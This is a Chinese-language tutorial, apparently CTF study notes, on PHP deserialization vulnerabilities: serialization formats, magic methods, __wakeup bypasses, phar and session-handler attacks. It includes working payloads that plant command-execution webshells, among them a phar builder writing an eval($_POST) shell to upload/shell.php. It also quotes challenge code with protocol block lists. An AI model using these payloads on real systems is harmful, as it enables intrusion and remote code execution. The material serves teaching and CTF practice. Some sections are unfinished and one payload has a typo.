# PHP 反序列化

序列化是将**数据结构**或**对象状态**转换为**可存储或传输的格式**的过程，以便在不同平台或环境中交换或保存，并在需要时恢复原始状态。

反序列化是将序列化后的数据（如字符串，字节流等）**还原**为原始对象的过程。

PHP 提供了两个内置函数实现序列化和反序列化：

- [serialize()](https://www.php.net/manual/zh/function.serialize.php)，序列化函数，生成值的可存储表示。可处理所有的类型，除了 resource 类型和一些 object（大多数是没有序列化接口的内置对象）

- [unserialize()](https://www.php.net/manual/zh/function.unserialize.php)，反序列化函数，从已存储的表示中创建 PHP 的值

## 序列化字符串格式

### 基本类型的序列化字符串格式

```php
<?php
echo "整型 " . serialize(10) . PHP_EOL; // 整型 i:10;
echo "浮点型 " . serialize(13.14).PHP_EOL; // 浮点型 d:13.14;
echo "字符串 " . serialize("This is a string"). PHP_EOL; // 字符串 s:16:"This is a string";
echo "布尔型 " . serialize(FALSE). PHP_EOL; // 布尔型 b:0;
echo "NULL " . serialize(NULL). PHP_EOL; // NULL N;
echo "数组 " . serialize(['foo', 'bar', 'baz']). PHP_EOL; // 数组 a:3:{i:0;s:3:"foo";i:1;s:3:"bar";i:2;s:3:"baz";}
```

- 反序列化示例

```php
$a = unserialize('s:16:"This is a string";');
var_dump($a); // string(16) "This is a string"
```

- 例题

```php
<?php
if(unserialize($_GET['name']) === 'admin') {
  echo "flag{...}";
}
```

### 对象的序列化字符串格式

[对象序列化](https://www.php.net/manual/zh/language.oop5.serialization.php)

```php
<?php
class Person
{
    public $username = 'john';
    protected $age = 20;
    private $isOK = false;

    public function get_username() {
        return $this->usernme;
    }
}

$p = new Person();
$serialized = serialize($p);
// 由于ASCII为0的字符不可见，替换为%00
echo str_replace("\x00", "%00", $serialized);
```

结果示例：

```php
O:6:"Person":3:{s:8:"username";s:4:"john";s:6:"%00*%00age";i:20;s:12:"%00Person%00isOK";b:0;}
// O:类名长度:类名:属性个数:{s:属性名长度:属性名;s:属性值长度:属性值;...}
```

序列化字符串的特点：

- 序列化字符串仅包含属性，不包含方法。
- 属性的访问控制不同，序列化后表现形式也不同：
  - `protected` 属性表示为 `%00*%00`
  - `private` 属性表示为 `%00类名%00`

## 常见魔术方法

魔术方法是一种特殊的方法，会在对象执行某些操作时覆盖 PHP 的默认操作，[了解更多](https://www.php.net/manual/zh/language.oop5.magic.php)

### 魔术方法名称及说明

```php
<?php
class Person {
    public $name, $age;

    function __construct($name, $age) {
        echo "__construct" . PHP_EOL;
        $this->name = $name;
        $this->age = $age;
    }

    public function get_name() {
        return  $this->name;
    }

    function __destruct() {
        echo "__destruct" . PHP_EOL;
    }

    public function __toString() {
        echo "__toString" . PHP_EOL;
        return "";
    }

    public function __wakeup() {
        echo "__wake_up" . PHP_EOL;
    }

    public function __sleep() {
        echo "__sleep" . PHP_EOL;
        return [];
    }

    public function __invoke() {
        echo "__invoke" . PHP_EOL;
    }

    public function __set($name, $value) {
        echo "__set" . PHP_EOL;
    }

    public function __get($name) {
        echo "__get" . PHP_EOL;
    }

    public function __call($name, $arguments) {
        echo "__call" . PHP_EOL;
    }
}

$o = new Person('Alice', 18);

// 对象被当成字符串时调用
echo $o;

// 以调用函数的方式调用对象
$o();

// 访问不存在的属性
$o->not_found_property;
// 给不存在的属性赋值
$o->not_found_property = 'test';

// 调用一个不可访问方法
$o->not_found_method();

// 序列化和反序列化
$serialized = serialize($o);
unserialize($serialized);

/* 输出
__construct
__toString
__invoke
__get
__set
__call
__sleep
__wake_up
__destruct
*/
```

| 魔术方法名称    | 说明                                                           |
| --------------- | -------------------------------------------------------------- |
| \_\_sleep()     | serialize() 时调用                                             |
| \_\_wakeup()    | unserialize() 时调用                                           |
| \_\_toString()  | 用于一个对象被当成字符串时调用                                 |
| \_\_invoke()    | 当尝试以调用函数的方式调用一个对象时                           |
| \_\_construct() | 构造函数，每次创建新对象时先调用此方法                         |
| \_\_destruct()  | 析构函数，某个对象的所有引用都被删除或者当对象被显式销毁时执行 |
| \_\_set()       | 在给不可访问（protected 或 private）或不存在的属性赋值时       |
| \_\_get()       | 读取不可访问（protected 或 private）或不存在的属性的值时       |
| \_\_call()      | 当对象调用一个不可访问方法时                                   |

### 例题分析

```php
<?php
class test {
    public $cmd;

    function __destruct() {
        eval($this->cmd);
    }
}

unserialize($_GET['u']);
```

`test`类的析构函数`__destruct()`存在代码执行漏洞。需要在本地调试代码，生成所需要的序列化字符串。

- EXP：

```php
<?php
// 类名与题目类名保持一致
class test {
  // 只保留属性，可直接赋值
  public $cmd='?><?=`$_GET["cmd"]`';

  // 不保留方法
}
// 实例化对象
$o = new test;

// 也可通过访问对象属性赋值
// $o->cmd = '';

// 输出序列化字符串，必要时可进行URL编码
echo serialize($o);
// O:4:"test":1:{s:3:"cmd";s:19:"?><?=`$_GET["cmd"]`";}
```

练习题

- BUUCTF - [NewStarCTF 2023 公开赛道]Unserialize?

## 常见绕过方法

- `__wakeup()`方法绕过（[CVE-2016-7124](https://www.cve.org/CVERecord?id=CVE-2016-7124)）

```text
When an unexpected object is created, __wakeup() is not invoked during deserialization, which could allow an attacker to bypass __wakeup() and invoke __destruct() with crafted properties.
PHP before 5.6.25 and 7.x before 7.0.10
```

当序列化字符串中表示对象属性个数的值**大于**真实属性个数时会跳过`__wakeup()`的执行

- `PHP > 7.1` 反序列化时对类属性的**访问控制**不敏感，只要属性名相同，就可以正常反序列化
- 表示字符类型的标识`S`为**大写**时，其内容会被当成十六进制解析，如`s:3:"\61\62\63"`
- 使用`+`绕过`preg_match('/^O:\d+/')`正则检查，如`O:+4:"test"`

练习题

- BUUCTF - [NewStarCTF 2023 公开赛道]Unserialize Again

## POP 链构造

面向属性编程（Property-Oriented Programing）

- 题眼

题目中有多个类，且每个类存在魔术方法

题目？？

## Phar 反序列化

### phar 文件介绍

`phar`扩展提供了一种将整个 PHP 应用程序放入单个叫做`phar`（PHP 归档）文件的方法，以便于分发和安装。phar 是 PHP 和 Archive 的合成词，大致上基于 Java 开发人员熟悉的 jar（Java 归档）。

phar 文件由[4 部分组成](https://www.php.net/manual/zh/phar.fileformat.phar.php)：

1. `stub`，标志，格式为`xxx<?php xxx; __HALT_COMPILER();?>`，前面内容不限，但必须以`__HALT_COMPILER();?>`结尾
2. `manifest`，清单。其中还会经`serialize()`序列化保存`Meta-data`
3. `contents`，内容
4. `signature`，签名，可选

`phar://`协议

```php
<?php
include 'phar:///path/to/myphar.phar/file.php';
?>
```

### 漏洞原理

2018 年，安全研究员`Sam Thomas`分享了议题[It’s a PHP unserialization vulnerability Jim, but not as we know it](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)，利用 phar 文件会以序列化的形式存储用户自定义的`meta-data`这一特性，拓展了 PHP 反序列化漏洞的攻击面。

题眼

- 允许上传精心构造的 phar 文件
- 允许使用`phar://`

添加任意的文件头+修改后缀名的方式将 phar 文件伪装成其他格式的文件

### 创建 phar 文件

?> 需将`php.ini`中的`phar.readonly`选项设置为`Off`，否则无法生成 phar 文件。

```php
<?php
class AnyClass
{
    public function __destruct()
    {
        echo "__destruct" . PHP_EOL;
    }
}

@unlink("test.phar"); // 删除已有文件
$phar = new Phar("test.phar"); //文件名，后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); //设置stub
$object = new AnyClass();
$phar->setMetadata($object); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

// 本地测试
if (file_exists("test.phar")) {
    file_get_contents("phar://test.phar");
}

```

在`meta-data`部分内容以序列化形式存储。

```bash
$ xxd test.phar
00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  <?php __HALT_COM
00000010: 5049 4c45 5228 293b 203f 3e0d 0a49 0000  PILER(); ?>..I..
00000020: 0001 0000 0011 0000 0001 0000 0000 0013  ................
00000030: 0000 004f 3a38 3a22 416e 7943 6c61 7373  ...O:8:"AnyClass
00000040: 223a 303a 7b7d 0800 0000 7465 7374 2e74  ":0:{}....test.t
00000050: 7874 0400 0000 dbee 2a68 0400 0000 0c7e  xt......*h.....~
00000060: 7fd8 b601 0000 0000 0000 7465 7374 8b7e  ..........test.~
00000070: 036c b419 d175 41e8 8c81 e4bd 8cf3 4b6e  .l...uA.......Kn
00000080: ca61 0200 0000 4742 4d42                 .a....GBMB
```

### 例题分析

<!-- [GXYCTF2019]BabysqliV3.0 -->

#### 例题1：[NewStarCTF 2023 公开赛道] PharOne

首页为文件上传，查看网页源代码，提示`class.php`，直接访问得源代码如下：

```php
<?php
highlight_file(__FILE__);
class Flag
{
    public $cmd;
    public function __destruct()
    {
        @exec($this->cmd);
    }
}
@unlink($_POST['file']);

```

经典反序列化题目，但是没有`unserialize()`函数。上传`phar`文件，使用`unlink`函数触发`phar://`协议。

```php
<?php
class Flag
{
    public $cmd = "echo PD9waHAgZXZhbCgkX1BPU1RbYV0pOz8+|base64 -d > upload/shell.php";
}

@unlink("test.phar"); // 删除已有文件
$phar = new Phar("test.phar"); //文件名，后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>"); //设置stub
$object = new Flag();
$phar->setMetadata($object); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

```

#### [SWPUCTF 2018]SimplePHP

题目存在任意文件读取漏洞，获取题目源代码。

- `file.php?file=function.php`

```php
<?php
//show_source(__FILE__); 
include "base.php";
header("Content-type: text/html;charset=utf-8");
error_reporting(0);
function upload_file_do()
{
    global $_FILES;
    $filename = md5($_FILES["file"]["name"] . $_SERVER["REMOTE_ADDR"]) . ".jpg";
    //mkdir("upload",0777); 
    if (file_exists("upload/" . $filename)) {
        unlink($filename);
    }
    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $filename);
    echo '<script type="text/javascript">alert("上传成功!");</script>';
}
function upload_file()
{
    global $_FILES;
    if (upload_file_check()) {
        upload_file_do();
    }
}
function upload_file_check()
{
    global $_FILES;
    $allowed_types = array("gif", "jpeg", "jpg", "png");
    $temp = explode(".", $_FILES["file"]["name"]);
    $extension = end($temp);
    if (empty($extension)) {
        //echo "<h4>请选择上传的文件:" . "<h4/>"; 
    } else {
        if (in_array($extension, $allowed_types)) {
            return true;
        } else {
            echo '<script type="text/javascript">alert("Invalid file!");</script>';
            return false;
        }
    }
}

```

- `file.php?file=file.php`

```php
<?php
header("content-type:text/html;charset=utf-8");
include 'function.php';
include 'class.php';
ini_set('open_basedir', '/var/www/html/');
$file = $_GET["file"] ? $_GET['file'] : "";
if (empty($file)) {
    echo "<h2>There is no file to show!<h2/>";
}
$show = new Show();
if (file_exists($file)) {
    $show->source = $file;
    $show->_show();
} else if (!empty($file)) {
    die('file doesn\'t exists.');
}
```

- `file.php?file=class.php`

```php
<?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key, $value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if (preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i', $this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
    }
    public function __wakeup()
    {
        if (preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if (isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}

```

### 练习题

- [D3CTF 2019]EzUpload
- [CISCN2019 华北赛区 Day1 Web1]Dropbox

```php
<?php
class dir
{
    public $userdir;
    public $url;
    public $filename;

    // 构造函数，为每个用户创建独立的目录
    public function __construct($url, $filename)
    {
        $this->userdir = "upload/" . md5($_SERVER["REMOTE_ADDR"]);
        $this->url = $url;
        $this->filename = $filename;
        if (!file_exists($this->userdir)) {
            mkdir($this->userdir, 0777, true);
        }
    }

    // 检查目录
    public function checkdir()
    {
        if ($this->userdir != "upload/" . md5($_SERVER["REMOTE_ADDR"])) {
            die('hacker!!!');
        }
    }

    // 检查url，协议不能为空，也不能是file、php
    public function checkurl()
    {
        $r = parse_url($this->url);
        if (!isset($r['scheme']) || preg_match("/file|php/i", $r['scheme'])) {
            die('hacker!!!');
        }
    }

    // 检查文件名，不能包含..、/，后缀不能有ph
    public function checkext()
    {
        if (stristr($this->filename, '..')) {
            die('hacker!!!');
        }
        if (stristr($this->filename, '/')) {
            die('hacker!!!');
        }
        $ext = substr($this->filename, strrpos($this->filename, ".") + 1);
        if (preg_match("/ph/i", $ext)) {
            die('hacker!!!');
        }
    }
    public function upload()
    {
        $this->checkdir();
        $this->checkurl();
        $this->checkext();
        $content = file_get_contents($this->url, NULL, NULL, 0, 2048);
        if (preg_match("/\<\?|value|on|type|flag|auto|set|\\\\/i", $content)) {
            die('hacker!!!');
        }
        file_put_contents($this->userdir . "/" . $this->filename, $content);
    }
    public function remove()
    {
        $this->checkdir();
        $this->checkext();
        if (file_exists($this->userdir . "/" . $this->filename)) {
            unlink($this->userdir . "/" . $this->filename);
        }
    }
    public function count($dir)
    {
        if ($dir === '') {
            $num = count(scandir($this->userdir)) - 2;
        } else {
            $num = count(scandir($dir)) - 2;
        }
        if ($num > 0) {
            return "you have $num files";
        } else {
            return "you don't have file";
        }
    }
    public function __toString()
    {
        return implode(" ", scandir(__DIR__ . "/" . $this->userdir));
    }
    public function __destruct()
    {
        $string = "your file in : " . $this->userdir;
        file_put_contents($this->filename . ".txt", $string);
        echo $string;
    }
}

if (!isset($_POST['action']) || !isset($_POST['url']) || !isset($_POST['filename'])) {
    highlight_file(__FILE__);
    die();
}

$dir = new dir($_POST['url'], $_POST['filename']);
if ($_POST['action'] === "upload") {
    $dir->upload();
} elseif ($_POST['action'] === "remove") {
    $dir->remove();
} elseif ($_POST['action'] === "count") {
    if (!isset($_POST['dir'])) {
        echo $dir->count('');
    } else {
        echo $dir->count($_POST['dir']);
    }
}
```

### 参考资料

- <https://paper.seebug.org/680/>
- <https://www.anquanke.com/post/id/240007>

## session 反序列化

`session`是一种“会话机制”，其数据存储于服务端，PHP 提供`$_SEESION`超全局变量

会话开始后，PHP 将会话中的数据保存到 `$_SESSION` 数组。

当 PHP 运行结束后，将`$_SESSION`中的内容进行序列化后，通过会话保存管理器将序列化后的字符串保存到`session`文件中。

```php
<?php
// 开启session会话
session_start();

$_SESSION['username'] = 'Alice';
```

| [常见配置选项](https://www.php.net/manual/en/session.configuration.php) | 说明                                                                      |
| ----------------------------------------------------------------------- | ------------------------------------------------------------------------- |
| session.save_handler                                                    | 保存形式，默认为 files                                                    |
| session.save_path                                                       | 保存路径，默认路径有`/tmp/`、`/var/lib/php/`                              |
| session.serialize_handler                                               | 序列化处理器名称，有`php`、`php_binary`和`php_serialize`三种，默认为`php` |

不同序列化处理器，序列化数据存储格式不同

```php
<?php
// 设置脚本执行期间的session处理器，php、php_binary、php_serialize
ini_set('session.serialize_handler', 'php_binary');

// 开启session会话
session_start();

$_SESSION['name'] = 'Alice';
$_SESSION['age'] = 25;
```

| 处理器名称    | 数据存储格式                                                                                                 |
| ------------- | ------------------------------------------------------------------------------------------------------------ |
| php           | 键名 + 竖线 + 经过 serialize() 函数序列化处理的值，如 name\|s:5:"Alice";age\|i:25;                           |
| php_binary    | 键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize()函数序列化处理的值，如 \x04names:5:"Alice";\x03agei:25; |
| php_serialize | $\_SESSION 数组经 serialize()函数处理，如 a:2:{s:4:"name";s:5:"Alice";s:3:"age";i:25;}                       |

### 例题分析

`2020-HFCTF-BabyUpload`
如果对`session`在序列化和反序列化时使用的处理器不同，会造成读写出现不一致，经特殊构造，会产生反序列化漏洞。混合使用`php`处理器和`php_serialize`处理器，，

假如提交的数据为`name=|O:4:"test":0:{}`

- 若存储用 `php_serialize` 处理器，则 `a:1:{s:4:"name";s:16:"|O:4:"test":0:{}";}`

- 若读取用 `php` 处理器，则会将`|`前面的内容当作键名，其后内容`O:4:"test":0:{}`进行反序列化，继而触发反序列化漏洞

题眼

- 可以控制`session`的内容
- 脚本文件指定了处理器

例题：Jarvis OJ — PHPINFO 分析

```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }

    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('index.php'));
}
?>
```

<http://web.jarvisoj.com:32784/>

1. 存在恶意类`OowoO`，析构方法中存在代码执行漏洞
2. 通过 `phpinfo()` 可知：

- _`session.upload_progress.enabled=On`_，可用文件上传在`session`中写入数据
- _`session.serialize_handler`_ 的默认值为`php_serialize`，脚本运行时配置为`php`，**处理器不一致**

3. 我们可通过文件上传控制`session`文件内容，进而实现`session`反序列化漏洞攻击

<!--
https://xz.aliyun.com/t/6640

相关题目
2020 高校战役赛 Hackme
https://miaotony.xyz/2020/11/05/CTF_2020_0xGame/#toc-heading-4
LCTF2018 bestphp’s revenge

漏洞:
Joomla 1.5-3.4 P168
-->

例题：Jarvis OJ — PHPINFO 解题步骤

1. 生成`payload`

```php
<?php
class OowoO{
    public $mdzz = '?><?=`$GET["cmd"]`';
}
$obj  = new OowoO();
echo serialize($obj);
// O:5:"OowoO":1:{s:4:"mdzz";s:18:"?><?=`$GET["cmd"]`";}
?>
```

2. 构造文件上传进度请求

```html
<form
  action="http://web.jarvisoj.com:32784/"
  method="POST"
  enctype="multipart/form-data"
>
  <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
  <input type="file" name="file" />
  <input type="submit" />
</form>
```

## 字符逃逸

<!--
https://medium.com/@lyltvip/php-deserialization-escape-970cd8ea714e
-->

## PHP 原生类

PHP 内置类

读取目录、文件

- [DirectoryIterator](https://www.php.net/manual/zh/class.directoryiterator.php) - 列出当前目录下的文件信息
- [Filesystemlterator](https://www.php.net/manual/zh/class.filesystemiterator.php) - 以绝路路径的形式列出的文件信息
- [Globlterator](https://www.php.net/manual/zh/class.globiterator.php) - 遍历一个文件目录，可以通过模式匹配来寻找文件路径

- [SplFileInfo](https://www.php.net/manual/en/class.splfileinfo.php) - SplFileInfo 类为单个文件的信息提供了高级的面向对象接口

## 练习题

- 基础
  - 极客大挑战 2019 php
  - 2020-网鼎杯朱雀组-phpweb
- POP
  - ISCC_2022_POP2022
  - 强网杯_2021_赌徒
  - 网鼎杯_2020_青龙组 AreUSerialz
  - ISCC_2022_findme
  - GYCTF2020 Easyphp
- 字符逃逸
  - 强网杯\_2020_Web 辅助

### 极客大挑战 2019 php

1. 目录扫描，`www.zip`
2. 绕过`__wakeup()`

```php
class Name {
 private $username = 'admin';
 private $password = 100;
}

$o = new Name;
// 由于属性为私有，采用URL编码
echo urlencode(serialize($o));
```

```php
O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D
```

### buuctf - 2020-网鼎杯朱雀组-phpweb

### ISCC_2022_POP2022
